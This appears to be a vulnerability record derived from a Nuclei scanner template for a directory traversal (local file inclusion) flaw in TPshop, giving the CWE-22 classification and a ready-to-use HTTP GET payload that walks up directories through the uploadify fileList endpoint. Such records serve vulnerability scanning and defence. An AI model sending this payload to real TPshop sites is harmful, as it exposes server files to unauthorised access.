# Vulnerability: TPshop - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`tpshop-directory-traversal.yaml`)

## Description
TPshop is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/index.php/Home/uploadify/fileList?type=.+&path=../../../
```

